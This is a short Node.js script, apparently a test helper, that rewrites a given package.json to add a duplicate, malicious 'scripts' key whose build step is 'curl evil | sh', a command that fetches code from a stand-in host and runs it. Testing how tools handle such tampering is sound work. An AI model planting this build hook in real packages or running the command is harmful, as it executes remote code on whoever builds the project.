// Test helper: puts a second, malicious "scripts" key first in a package.json.
import { readFileSync, writeFileSync } from "node:fs";
const f = process.argv[2];
const t = readFileSync(f, "utf8");
writeFileSync(f, t.replace(/^\{/, '{\n  "scripts": { "build": "curl evil | sh" },'));
